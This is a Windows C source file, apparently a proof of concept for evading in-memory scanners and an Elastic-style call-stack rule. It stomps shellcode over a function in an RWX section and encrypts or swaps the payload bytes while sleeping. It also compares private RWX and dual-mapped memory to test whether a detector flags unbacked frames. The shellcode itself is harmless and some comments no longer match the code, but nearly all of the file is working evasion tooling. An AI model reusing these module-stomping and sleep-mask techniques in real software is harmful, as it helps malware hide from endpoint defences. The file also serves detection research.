#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// ---------------- compiler portability (MSVC vs MinGW-w64) ----------------
#if defined(__GNUC__)
#define NOINLINE __attribute__((noinline))
#define PAY_SEG  __attribute__((section(".pay")))
#define STB_SEG  __attribute__((section(".stb")))
#define WSPRINTF swprintf
#define WCPY     wcscpy
#define WCAT     wcscat
// Declare .pay as RWX ("awx") BEFORE GCC emits its own "ax" for the section:
// GAS keeps the FIRST declaration's attributes, so .pay maps writable and
// the sleep-mask needs no VirtualProtect. .stb stays "ax" (RX).
__asm__(".section .pay,\"awx\"\n\t.section .stb,\"ax\"\n\t.text");
#else
#define NOINLINE __declspec(noinline)
#define PAY_SEG
#define STB_SEG
#define WSPRINTF swprintf_s
#define WCPY     wcscpy_s
#define WCAT     wcscat_s
// .pay is linked RWX (execute|read|write) so the sleep-mask engine and the
// stomp need ZERO VirtualProtect calls — the loader maps it writable from
// the start. .stb stays RX (StubSleep never modifies itself).
#pragma section(".pay", execute, read, write)
#pragma section(".stb", execute, read)
#endif

// ---------------- victim module (formerly victim.dll) ----------------

typedef struct Shared {
    ULONGLONG shellBase;
    ULONGLONG islandStart;
    ULONGLONG writeBase;   // dual-view: RW alias of the payload pages
    ULONG     sleepMs;
    ULONG     key;
    ULONG     fullEncrypt;
    ULONG     walkFrames;   // 1 = classify stack frames (Elastic-style)
    ULONG     restoreContent; // 1 = swap .pay to pristine bytes while sleeping
    ULONG     calls;
    ULONG     lastResult;
    ULONG     reserved;
} Shared;

static volatile Shared g_shared = {0, 0, 0, 8000, 0xA5, 0, 0, 0, 0, 0, 0};
static HANDLE g_mapHandles[2] = {0, 0};

// content-restore mode: pristine disk image of StompTarget + the stomped
// shellcode copy, so the sleep engine can swap the page contents
static unsigned char g_pristinePay[0x9D] = {0};
static unsigned char g_shellcodeCopy[0x9D] = {0};

static void MarkStage(const char* s); // defined below; used by StubSleep
static LONG WINAPI CrashFilter(EXCEPTION_POINTERS* ep) {
    char buf[96];
    snprintf(buf, sizeof(buf), "crash at %p (code 0x%lX)",
             (void*)ep->ExceptionRecord->ExceptionAddress,
             ep->ExceptionRecord->ExceptionCode);
    MarkStage(buf);
    return EXCEPTION_EXECUTE_HANDLER;
}

// ---------------- Elastic-style stack classification ----------------
extern "C" USHORT WINAPI RtlCaptureStackBackTrace(ULONG framesToSkip,
                                                  ULONG framesToCapture,
                                                  PVOID* backTrace,
                                                  PULONG backTraceHash);

static const char* ProtName(DWORD p) {
    switch (p & 0xFF) {
        case PAGE_EXECUTE:           return "X";
        case PAGE_EXECUTE_READ:      return "RX";
        case PAGE_EXECUTE_READWRITE: return "RWX";
        case PAGE_READONLY:          return "R";
        case PAGE_READWRITE:         return "RW";
        case PAGE_NOACCESS:          return "NA";
        default:                     return "?";
    }
}

NOINLINE static void WalkAndClassify(void) {
    PVOID frames[40] = {0};
    USHORT n = RtlCaptureStackBackTrace(0, 40, frames, NULL);
    printf("[walk] captured %u frames\n", (int)n);
    ULONG unbacked = 0;
    for (USHORT i = 0; i < n && i < 40; i++) {
        MEMORY_BASIC_INFORMATION mbi;
        SIZE_T cb = VirtualQuery(frames[i], &mbi, sizeof(mbi));
        const char* type = "?";
        int isImage = 0;
        if (cb && mbi.State == MEM_COMMIT) {
            if (mbi.Type == MEM_IMAGE)      { type = "IMAGE";   isImage = 1; }
            else if (mbi.Type == MEM_PRIVATE) type = "PRIVATE";
            else if (mbi.Type == MEM_MAPPED)  type = "MAPPED";
            else type = "OTHER";
        }
        wchar_t mod[MAX_PATH] = L"";
        const wchar_t* shortMod = L"?";
        ULONGLONG off = 0;
        if (isImage) {
            GetModuleFileNameW((HMODULE)mbi.AllocationBase, mod, MAX_PATH);
            wchar_t* slash = wcsrchr(mod, L'\\');
            shortMod = slash ? slash + 1 : mod;
            off = (ULONGLONG)frames[i] - (ULONGLONG)mbi.AllocationBase;
        } else {
            unbacked++;
        }
        printf("[walk] %02u 0x%p %-22ls+0x%llX %-8s %-6s %s\n",
               (unsigned)i, frames[i], shortMod, off, type,
               cb ? ProtName(mbi.Protect) : "?", isImage ? "backed" : "UNBACKED");
    }
    printf("[walk] unbacked_frames=%lu -> Elastic predicate "
           "call_stack_contains_unbacked=%s\n", unbacked,
           unbacked ? "TRUE (rule would match)" : "false (rule silent)");
}
#if defined(_MSC_VER)
#pragma code_seg(".pay") // MSVC places functions via pragma; GCC via attributes
#endif
PAY_SEG NOINLINE static void DummyCall(void) { g_shared.reserved++; }

PAY_SEG NOINLINE static void StompTarget(void) {
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    DummyCall();
    g_shared.reserved = 0x12345678;
}
// Sleep-mask engine: encrypt [shellBase, islandStart) -> SleepEx -> decrypt.
// .pay is linked RWX, so the XOR works in place — no VirtualProtect, no
// syscall, zero protection-related API calls. StubSleep itself lives in .stb
// (RX, separate page) and is never encrypted.
#if defined(_MSC_VER)
#pragma code_seg(".stb")
#endif
STB_SEG NOINLINE static void StubSleep(void) {
    ULONGLONG start  = g_shared.shellBase;
    ULONGLONG island = g_shared.islandStart;
    if (island <= start) {
        island = start + 0x10;
    }
    size_t encLen = (size_t)(island - start);
    if (g_shared.fullEncrypt) {
        encLen += 0x40; // also cover the preserved window (control mode)
    }

    BYTE digest[4];
    memcpy(digest, (const void*)start, sizeof(digest));

    BYTE* p = (BYTE*)(g_shared.writeBase ? g_shared.writeBase : start);
    const BYTE key = (BYTE)g_shared.key;

    MarkStage("stage: stub before encrypt");
    if (g_shared.restoreContent) {
        memcpy(p, g_pristinePay, sizeof(g_pristinePay));
        MarkStage(memcmp(p, g_pristinePay, sizeof(g_pristinePay)) == 0
                      ? "stage: restored pristine OK"
                      : "stage: restore FAILED");
    } else {
        for (size_t i = 0; i < encLen; i++) {
            p[i] ^= key; // direct write into the RWX-mapped image section
        }
    }
    MarkStage("stage: stub before sleep");
    if (g_shared.walkFrames) {
        WalkAndClassify(); // classify the frames the scanner would see
    }
    SleepEx(g_shared.sleepMs, FALSE); // <- detector scans the process here
    MarkStage("stage: stub after sleep");

    if (g_shared.restoreContent) {
        memcpy(p, g_shellcodeCopy, sizeof(g_shellcodeCopy));
    } else {
        for (size_t i = 0; i < encLen; i++) {
            p[i] ^= key;
        }
    }

    g_shared.lastResult =
        (memcmp((const void*)start, digest, sizeof(digest)) == 0) ? 1 : 0;
}
#if defined(_MSC_VER)
#pragma code_seg() // back to default .text for the loader code
#endif

// ---------------- PIC shellcode (see comments for layout) ----------------
//
//  0x00: 48 83 EC 28          sub rsp, 0x28        (imm8 patched to match .pdata)
//  0x04: 90 x34               nop filler
//  0x26: 8B 05 [A]            mov eax, [rip+d]     ; d -> &g_shared.reserved
//  0x2C: 89 44 24 20          mov [rsp+0x20], eax  ; scoring op (rsp operand)
//  0x30: E8 [B]               call StubSleep       ; <- call site (ret = 0x35)
//  0x35: 8B 05 [C] / FF C0 / 89 05 [D]             ; g_shared.calls++ after wake
//  0x43: 48 8D 15 [E]         lea rdx, [rip+d]     ; d -> text string
//  0x4A: 4C 8D 05 [F]         lea r8,  [rip+d]     ; d -> caption string
//  0x51: 45 33 C9 / 33 C9                          ; MB_OK, hwnd = NULL
//  0x56: 48 B8 [G]            mov rax, imm64       ; MessageBoxA (patched)
//  0x60: FF D0                call rax
//  0x62: 89 05 [H]            mov [rip+d], eax     ; d -> &g_shared.reserved
//  0x68: 48 83 C4 28          add rsp, 0x28        (imm8 patched)
//  0x6C: C3                   ret
//  0x6D: "SleepMask Bypass Demo\0"    (caption; NUL at 0x82)
//  0x83: "Hello from PIC shellcode\0" (text)
// total 0x9B bytes of code+strings (declared [0x9D], trailing zero padding);
// scan window = [0x15, 0x3D) stays plaintext while sleeping
static const unsigned char kShellcode[0xC0] = {
    0x48, 0x83, 0xEC, 0x28,                               // 0x00
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x04
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x0C
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,       // 0x14 (0x14-0x1B: encrypted prefix)
    // 0x1C: scoring filler (window origin 0x20 is an instruction boundary)
    0x48, 0x83, 0xEC, 0x00, 0x48, 0x83, 0xEC, 0x00,       // 0x1C
    0x66, 0x90,                                           // 0x24
    // rbx = *(&g_shared ptr) — no imm64 constants, vtable-style calls
    0x48, 0x8D, 0x1D, 0x00, 0x00, 0x00, 0x00,             // 0x26 lea rbx,[rip+d] -> &tbl.g_shared
    0x48, 0x8B, 0x1B,                                     // 0x2D mov rbx,[rbx]
    0x89, 0x44, 0x24, 0x20,                               // 0x30 scoring op
    // StubSleep via table (ret = 0x40)
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x34 lea rax,[rip+d] -> &tbl.stub
    0x48, 0x8B, 0x00,                                     // 0x3B mov rax,[rax]
    0xFF, 0xD0,                                           // 0x3E call rax
    0x8B, 0x43, 0x00,                                     // 0x40 slot C (calls++)
    0xFF, 0xC0,                                           // 0x43
    0x89, 0x43, 0x00,                                     // 0x45 slot D
    0xC7, 0x43, 0x00, 0x01, 0x00, 0x00, 0x00,             // 0x48 slot R1 (mov dword [rbx+reserved],1)
    // GetStdHandle(STD_OUTPUT_HANDLE) via table
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x4F lea rax,[rip+d] -> &tbl.gsh
    0x48, 0x8B, 0x00,                                     // 0x56 mov rax,[rax]
    0xB9, 0xF5, 0xFF, 0xFF, 0xFF,                         // 0x59 mov ecx,-11
    0xFF, 0xD0,                                           // 0x5E call rax
    0x48, 0x89, 0xC1,                                     // 0x60 mov rcx,rax (handle, no stack spill)
    // WriteFile(hStdOut, "OK\n", 3, &written, NULL) via table
    0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00,             // 0x63 lea rax,[rip+d] -> &tbl.wf
    0x48, 0x8B, 0x00,                                     // 0x6A mov rax,[rax]
    0x48, 0x8D, 0x15, 0x00, 0x00, 0x00, 0x00,             // 0x6D lea rdx,[rip+d] -> marker
    0x41, 0xB8, 0x03, 0x00, 0x00, 0x00,                   // 0x74 mov r8d,3
    0x4C, 0x8D, 0x4C, 0x24, 0x18,                         // 0x7A lea r9,[rsp+0x18] (&written, in-frame)
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, // 0x7F mov qword [rsp+0x20],0
    0xFF, 0xD0,                                           // 0x88 call rax
    0x48, 0x83, 0xC4, 0x28,                               // 0x8A
    0xC3,                                                 // 0x8E
    // 0x8F marker
    'O', 'K', '\n', 0,
    // 0x93 view-local pointer table (all patched at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0x93 tbl.g_shared
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0x9B tbl.gsh (GetStdHandle)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // 0xA3 tbl.wf (WriteFile)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00        // 0xAB tbl.stub
};
static void PatchSlot(unsigned char* shell, ULONGLONG shellBase, size_t slotOff,
                      ULONGLONG target) {
    ULONG disp = (ULONG)(target - (shellBase + slotOff));
    memcpy(shell + (slotOff - 4), &disp, sizeof(disp));
}

// ---------------- detector integration ----------------
static wchar_t g_detectorPath[MAX_PATH];
static int g_detectorFound = 0;

static int FindDetector(const wchar_t* overridePath) {
    if (overridePath && overridePath[0]) {
        if (GetFileAttributesW(overridePath) != INVALID_FILE_ATTRIBUTES) {
            WCPY(g_detectorPath, overridePath);
            g_detectorFound = 1;
            return 0;
        }
        printf("[-] detector not found at: %ls\n", overridePath);
    }
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);
    wchar_t* slash = wcsrchr(self, L'\\');
    if (slash) *slash = 0;

    wchar_t cand[3][MAX_PATH];
    WSPRINTF(cand[0], MAX_PATH, L"%ls\\sleep_duck.exe", self);       // exe dir
    WSPRINTF(cand[1], MAX_PATH, L"%ls\\..\\sleep_duck.exe", self);   // parent dir
    GetCurrentDirectoryW(MAX_PATH, cand[2]);
    WCAT(cand[2], L"\\sleep_duck.exe");                             // cwd
    for (int i = 0; i < 3; i++) {
        if (GetFileAttributesW(cand[i]) != INVALID_FILE_ATTRIBUTES) {
            WCPY(g_detectorPath, cand[i]);
            g_detectorFound = 1;
            return 0;
        }
    }
    printf("[-] sleep_duck.exe not found (looked next to exe, parent dir, cwd)\n");
    return -1;
}

static HANDLE SpawnDetector(DWORD pid, const wchar_t* outFile) {
    wchar_t cmd[1024];
    WSPRINTF(cmd, 1024, L"\"%ls\" -pid %lu", g_detectorPath, pid);

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE; // child's std handles must be inheritable
    HANDLE hOut = CreateFileW(outFile, GENERIC_WRITE, FILE_SHARE_READ, &sa,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        printf("[-] cannot create output file\n");
        return NULL;
    }

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hOut;
    si.hStdError = hOut;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

    if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        CloseHandle(hOut);
        return NULL;
    }
    DWORD exitCode = 0;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    printf("[spawn] detector pid=%lu initial exit code=%lu\n", pi.dwProcessId,
           exitCode);
    CloseHandle(hOut);
    CloseHandle(pi.hThread);
    return pi.hProcess;
}

static void PrintDetectorOutput(const wchar_t* outFile) {
    HANDLE hIn = CreateFileW(outFile, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hIn == INVALID_HANDLE_VALUE) {
        printf("(no detector output)\n");
        return;
    }
    char buf[4096];
    DWORD rd = 0;
    printf("----- detector output -----\n");
    while (ReadFile(hIn, buf, sizeof(buf) - 1, &rd, NULL) && rd > 0) {
        buf[rd] = 0;
        printf("%s", buf);
    }
    printf("---------------------------\n");
    CloseHandle(hIn);
}

// ---------------- experiment ----------------

static void MarkStage(const char* s) {
    HANDLE h = CreateFileA("stage.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w = 0;
        WriteFile(h, s, (DWORD)strlen(s), &w, NULL);
        WriteFile(h, "\r\n", 2, &w, NULL);
        CloseHandle(h);
    }
}

// unbuffered hex dump (crash-safe): writes to stage.txt like MarkStage
static void MarkStageHex(const char* tag, const void* p, size_t n) {
    HANDLE h = CreateFileA("stage.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD w = 0;
    WriteFile(h, tag, (DWORD)strlen(tag), &w, NULL);
    WriteFile(h, " ", 1, &w, NULL);
    const unsigned char* b = (const unsigned char*)p;
    char line[96];
    for (size_t i = 0; i < n; i += 16) {
        size_t k = 0;
        for (size_t j = 0; j < 16 && i + j < n; j++) {
            k += (size_t)sprintf_s(line + k, sizeof(line) - k, "%02X ",
                                   b[i + j]);
        }
        line[k] = 0;
        WriteFile(h, line, (DWORD)k, &w, NULL);
        WriteFile(h, "\r\n", 2, &w, NULL);
    }
    CloseHandle(h);
}

static int RunExperiment(const wchar_t* mode) {
    MarkStage("stage: begin");
    ULONGLONG shellBase = (ULONGLONG)(uintptr_t)&StompTarget;

    // walkpriv = control arm: same payload in a PRIVATE RWX allocation.
    // walkmap = dual-view arm: RW view + RX view over one section (no RWX
    // page, but RX frames are MEM_MAPPED — the classification question).
    int priv = (wcscmp(mode, L"walkpriv") == 0);
    // walkmap = dual-view arm: one section, two views — RW view for writes,
    // RX view for execution. No page in the process is RWX, but the RX-view
    // frames are MEM_MAPPED, not MEM_IMAGE: does a stack classifier still
    // treat them as backed?
    int mapmode = (wcscmp(mode, L"walkmap") == 0);
    BYTE* execBase = (BYTE*)(uintptr_t)shellBase;
    if (priv) {
        // E8 rel32 is 32-bit: the copy must live within +-2GB of the image.
        ULONGLONG image = (ULONGLONG)(uintptr_t)&StompTarget;
        LONGLONG probes[] = { -0x100000LL, -0x400000LL, -0x1000000LL,
                              -0x4000000LL, -0x10000000LL, 0x100000LL,
                              0x400000LL,  0x1000000LL,  0x4000000LL };
        for (int k = 0; k < (int)(sizeof(probes) / sizeof(probes[0])); k++) {
            ULONGLONG cand = image + probes[k];
            LONGLONG d = (LONGLONG)(uintptr_t)&StubSleep -
                         ((LONGLONG)cand + 0x35);
            if (d < INT32_MIN || d > INT32_MAX) continue;
            execBase = (BYTE*)VirtualAlloc((LPVOID)cand, 0x2000,
                                           MEM_COMMIT | MEM_RESERVE,
                                           PAGE_EXECUTE_READWRITE);
            if (execBase) {
                printf("[walkpriv] payload runs from %p (PRIVATE RWX = "
                       "unbacked)\n", execBase);
                break;
            }
        }
        if (!execBase) {
            printf("[-] could not allocate private buffer within +-2GB of "
                   "the image\n");
            return 1;
        }
        shellBase = (ULONGLONG)(uintptr_t)execBase;
    } else if (mapmode) {

        HANDLE hMap = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                                         PAGE_EXECUTE_READWRITE, 0, 0x2000,
                                         NULL);
        if (!hMap) {
            printf("[-] CreateFileMapping failed: %lu\n", GetLastError());
            return 1;
        }
        BYTE* rwView = (BYTE*)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0x2000);
        if (!rwView) {
            printf("[-] MapViewOfFile(RW) failed: %lu\n", GetLastError());
            return 1;
        }
        BYTE* rxView = (BYTE*)MapViewOfFile(hMap,
                                            FILE_MAP_READ | FILE_MAP_EXECUTE,
                                            0, 0, 0x2000);
        if (!rxView) {
            printf("[-] MapViewOfFile(RX) failed: %lu\n", GetLastError());
            return 1;
        }
        g_mapHandles[0] = hMap;
        g_mapHandles[1] = rwView;
        execBase = rxView;
        shellBase = (ULONGLONG)(uintptr_t)rxView;
        {
            char dbg[160];
            snprintf(dbg, sizeof(dbg), "hMap=%p rwView=%p rxView=%p",
                     (void*)hMap, (void*)rwView, (void*)rxView);
            MarkStage(dbg);
        }
        printf("[walkmap-live] RX view %p (MEM_MAPPED, X) <-> RW view %p "
               "(MEM_MAPPED, RW), same physical pages; .pay untouched\n",
               rxView, rwView);
    }

    unsigned char shell[sizeof(kShellcode)];
    memcpy(shell, kShellcode, sizeof(shell));
    ULONGLONG stubSleepAddr = (ULONGLONG)(uintptr_t)&StubSleep;

    {
        unsigned char origPro[4];
        memcpy(origPro, (const void*)&StompTarget, sizeof(origPro));
        if (!(origPro[0] == 0x48 && origPro[1] == 0x83 && origPro[2] == 0xEC)) {
            printf("[-] unexpected stomp-target prologue: %02X %02X %02X\n",
                   origPro[0], origPro[1], origPro[2]);
            return 1;
        }
        shell[0x03] = origPro[3]; // sub rsp, imm8
        shell[0x8D] = origPro[3]; // add rsp, imm8 (0x8A: 48 83 C4 imm8)
        printf("[adapt] stomp-target prologue sub rsp,0x%02X (shellcode matches)\n",
               origPro[3]);
    }
    // load via a view-local pointer table (vtable-style call sequence).
    ULONGLONG gSharedAddr = (ULONGLONG)(uintptr_t)&g_shared;
    unsigned char offCalls = (unsigned char)((char*)&g_shared.calls - (char*)&g_shared);
    unsigned char offReserved = (unsigned char)((char*)&g_shared.reserved - (char*)&g_shared);

    // resolve kernel32 functions at load time (no UI, no TSF — pure stdio)
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    FARPROC gsh = hK32 ? GetProcAddress(hK32, "GetStdHandle") : NULL;
    FARPROC wf = hK32 ? GetProcAddress(hK32, "WriteFile") : NULL;
    if (!gsh || !wf) {
        printf("[-] cannot resolve GetStdHandle/WriteFile\n");
        return 1;
    }
    ULONGLONG gshAddr = (ULONGLONG)(uintptr_t)gsh;
    ULONGLONG wfAddr = (ULONGLONG)(uintptr_t)wf;
    printf("[adapt] GetStdHandle=0x%llX WriteFile=0x%llX\n", gshAddr, wfAddr);

    // view-local pointer table
    memcpy(shell + 0x93, &gSharedAddr, 8);    // tbl.g_shared
    memcpy(shell + 0x9B, &gshAddr, 8);        // tbl.gsh
    memcpy(shell + 0xA3, &wfAddr, 8);         // tbl.wf
    memcpy(shell + 0xAB, &stubSleepAddr, 8);  // tbl.stub
    // lea targets (rip-rel within the view — disp32 always in range)
    PatchSlot(shell, shellBase, 0x2D, shellBase + 0x93); // lea rbx -> tbl.g_shared
    PatchSlot(shell, shellBase, 0x3B, shellBase + 0xAB); // lea rax -> tbl.stub
    PatchSlot(shell, shellBase, 0x56, shellBase + 0x9B); // lea rax -> tbl.gsh
    PatchSlot(shell, shellBase, 0x6A, shellBase + 0xA3); // lea rax -> tbl.wf
    PatchSlot(shell, shellBase, 0x74, shellBase + 0x8F); // lea rdx -> marker 
    shell[0x42] = offCalls;                     // slot C (mov eax,[rbx+calls])
    shell[0x47] = offCalls;                     // slot D (mov [rbx+calls],eax)
    shell[0x4A] = offReserved;                  // slot R1 (mov dword [rbx+reserved],1)

    // Save the pristine StompTarget image before stomping (content-restore
    // mode restores it while sleeping, then re-stomps on wake).
    memcpy(g_pristinePay, (const void*)&StompTarget, sizeof(g_pristinePay));

    // Stomp: .pay is linked RWX so this is a plain memcpy (no VirtualProtect
    // anywhere). walkpriv: private RWX buffer. walkmap: RW view (shared pages).
    BYTE* writeTarget = mapmode ? (BYTE*)g_mapHandles[1] : execBase;
    memcpy(writeTarget, shell, sizeof(shell));
    memcpy(g_shellcodeCopy, shell, sizeof(g_shellcodeCopy));
    MarkStageHex("[post-stomp] exec view:", (const void*)shellBase, 0xB0);

    // self-check: the marker at +0x91 must match the template layout
    const char* marker = (const char*)(shellBase + 0x8F);
    if (strcmp(marker, "OK\n") != 0) {
        printf("[-] marker layout mismatch! marker=[%s]\n", marker);
        return 1;
    }
    printf("[adapt] marker OK @+0x8F\n");

    ULONG ms = 8000;
    g_shared.shellBase = shellBase;
    g_shared.islandStart = shellBase + 0x20; // plaintext island starts at window base (ret=0x40)
    g_shared.sleepMs = ms;
    g_shared.key = 0xA5;
    g_shared.calls = 0;
    g_shared.lastResult = 0;
    g_shared.fullEncrypt = (wcscmp(mode, L"full") == 0) ? 1 : 0;
    g_shared.walkFrames = (wcscmp(mode, L"walk") == 0 || priv || mapmode) ? 1 : 0;
    g_shared.writeBase = mapmode ? (ULONGLONG)(uintptr_t)g_mapHandles[1] : 0;
    // content-restore: default island only (walk keeps the classic XOR path)
    g_shared.restoreContent = (wcscmp(mode, L"island") == 0) ? 1 : 0;

    printf("[mode=%ls] pid=%lu StompTarget(shellcode)=%p\n", mode,
           GetCurrentProcessId(), (void*)shellBase);
    {
        unsigned char raw[0xC8];
        memcpy(raw, (const void*)shellBase, sizeof(raw));
        printf("[layout] stomped shellcode:");
        for (int i = 0; i < (int)sizeof(raw); i++) {
            if (i % 16 == 0) printf("\n  %04X: ", i);
            printf("%02X ", raw[i]);
        }
        printf("\n");
        MarkStageHex("[layout] shellcode:", (const void*)shellBase, 0xC0);
    }

    // Standalone PoC: no detector child process is spawned. Use -scan to
    // explicitly run sleep_duck.exe against this process if needed.
    if (wcscmp(mode, L"idle") == 0) {
        SleepEx(ms, FALSE); // baseline: no payload call
        MarkStage("stage: idle sleep done");
    } else {
        MarkStage("stage: before shellcode");
        ((void (*)(void))shellBase)(); // shellcode: encrypt -> SleepEx -> decrypt
                                      // -> calls++ -> MessageBoxA -> ret
        MarkStage("stage: after shellcode");
    }

    printf("[mode=%ls] payload calls=%lu lastResult=%lu (1 = decrypt verified) "
           "payloadResult=%ld (0x%lX, 1 = marker written)\n",
           mode, g_shared.calls, g_shared.lastResult, (long)g_shared.reserved,
           (unsigned long)g_shared.reserved);
    return 0;
}

int wmain(int argc, wchar_t** argv) {
    SetConsoleOutputCP(CP_UTF8);
    SetUnhandledExceptionFilter(CrashFilter); // temporary crash diagnostics

    const wchar_t* detectorOverride = (argc > 2) ? argv[2] : NULL;
    FindDetector(detectorOverride);

    if (argc > 1 && wcscmp(argv[1], L"-scan") == 0) {
        if (!g_detectorFound) return 1;
        wchar_t outFile[MAX_PATH];
        WSPRINTF(outFile, MAX_PATH, L"%ls\\detector_scan.txt", L".");
        HANDLE hDet = SpawnDetector(GetCurrentProcessId(), outFile);
        if (hDet) {
            WaitForSingleObject(hDet, 30000);
            CloseHandle(hDet);
        }
        PrintDetectorOutput(outFile);
        return 0;
    }

    if (argc > 1 && wcscmp(argv[1], L"-desktop") == 0) {
        HWINSTA sta = GetProcessWindowStation();
        HDESK dsk = GetThreadDesktop(GetCurrentThreadId());
        wchar_t staName[256] = {0}, dskName[256] = {0};
        DWORD n = 0;
        GetUserObjectInformationW(sta, UOI_NAME, staName, sizeof(staName), &n);
        n = 0;
        GetUserObjectInformationW(dsk, UOI_NAME, dskName, sizeof(dskName), &n);
        DWORD pid = GetCurrentProcessId();
        DWORD sid = GetProcessId(GetCurrentProcess());
        printf("[desktop] pid=%lu winsta=%ls desktop=%ls\n", pid, staName, dskName);
        (void)sid;
        return 0;
    }

    if (argc > 1 && wcscmp(argv[1], L"-msgtest") == 0) {
        // sanity: does a direct MessageBoxA from this process show up?
        printf("[msgtest] calling MessageBoxA directly...\n");
        int r = MessageBoxA(NULL, "direct test", "direct test", MB_OK);
        printf("[msgtest] MessageBoxA returned %d\n", r);
        return 0;
    }

    if (argc > 1 && wcscmp(argv[1], L"-full") == 0) {
        RunExperiment(L"full");
        return 0;
    }
    if (argc > 1 && (wcscmp(argv[1], L"-walk") == 0 ||
                     wcscmp(argv[1], L"-walkpriv") == 0 ||
                     wcscmp(argv[1], L"-walkmap") == 0)) {
        RunExperiment(argv[1] + 1); // "walk" / "walkpriv" / "walkmap"
        return 0;
    }
    if (argc > 1 && wcscmp(argv[1], L"-idle") == 0) {
        RunExperiment(L"idle");
        return 0;
    }

    // default (double-click): island experiment, then interactive menu
    RunExperiment(L"island");

    printf("\n=============================================\n");
    printf(" 实验完成。菜单：\n");
    printf("  [1] 运行检测器扫描本进程（单独检测）\n");
    printf("  [2] 重跑实验组（island）\n");
    printf("  [3] 跑控制组（full，预期被检出）\n");
    printf("  [0] 退出\n");
    printf("=============================================\n");
    for (;;) {
        printf("> ");
        int c = getchar();
        if (c == EOF) break;
        if (c == '\n' || c == '\r') continue;
        if (c == '0') break;
        if (c == '1') {
            if (!g_detectorFound) {
                printf("[-] sleep_duck.exe 未找到\n");
                continue;
            }
            wchar_t outFile[MAX_PATH];
            WSPRINTF(outFile, MAX_PATH, L"%ls\\detector_menu.txt", L".");
            HANDLE hDet = SpawnDetector(GetCurrentProcessId(), outFile);
            if (hDet) {
                WaitForSingleObject(hDet, 30000);
                CloseHandle(hDet);
            }
            PrintDetectorOutput(outFile);
        } else if (c == '2') {
            RunExperiment(L"island");
        } else if (c == '3') {
            RunExperiment(L"full");
        }
    }
    return 0;
}
